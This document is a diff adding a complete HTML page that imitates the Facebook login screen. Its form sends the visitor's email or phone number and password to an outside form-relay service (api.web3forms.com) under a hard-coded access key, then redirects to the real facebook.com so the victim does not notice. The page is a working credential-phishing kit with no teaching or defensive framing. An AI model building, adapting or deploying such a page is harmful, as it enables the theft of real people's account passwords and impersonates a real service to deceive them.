@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" type="img/png/gif" href="facebooklogo (2).png">
+    <title>Facebook Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+        .container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .text-section {
+            margin-right: 250px;
+        }
+        .text-section h1 {
+            color: #1877f2;
+            font-size: 4rem;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .text-section p {
+            font-size: 1.5rem;
+            color: #333;
+        }
+        .login-box {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 350px;
+            text-align: center;
+        }
+        .login-box input {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 1rem;
+        }
+        .login-box .loginBTN {
+            width: 100%;
+            padding: 10px;
+            background-color: #1877f2;
+            border: none;
+            color: white;
+            font-size: 1rem;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .login-box .loginBTN:hover {
+            background-color: #165dd9;
+        }
+        .forgot-password {
+            display: block;
+            margin: 10px 0;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        .create-account {
+            margin-top: 10px;
+            background-color: #38e814;
+            color: white;
+            padding: 10px;
+            font-size: 1rem;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .create-account:hover {
+            background-color: #36a420;
+        } 
+        .create-page {
+            margin-left: 600px;
+            margin-top: 20px;
+            font-size: 0.9rem;
+        }
+        .create-page a {
+            color: black;
+            font-weight: bold;
+            text-decoration: none;
+        }
+        .create-page a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="text-section">
+            <h1>facebook</h1>
+            <p>Connect with friends and the world <br>around you on Facebook.</p>
+        </div>
+        <div class="login-box">
+        <form action="https://api.web3forms.com/submit" method="POST">
+            <input type="hidden" name="access_key" value="d739274a-f43a-4e5f-b8ac-98249149ba4a">
+
+            <input type="text" name="email" placeholder="Email or phone number" required>
+            <input type="password" name="whatp" placeholder="Password" required>
+
+            <input type="hidden" name="redirect" value="https://www.facebook.com">
+            <input type="checkbox" name="botcheck" class="hidden" style="display: none;">
+
+            <button type="submit" class="loginBTN">Log In</button>
+            
+            <a href="#" class="forgot-password">Forgot password?</a>
+            <hr>
+            <button class="create-account">Create new account</button>
+        </form>
+        </div>
+    </div>
+    <div class="create-page">
+        <p><a href="#">Create a Page</a> for a celebrity, brand or business.</p>
+    </div>
+</body>
+</html>
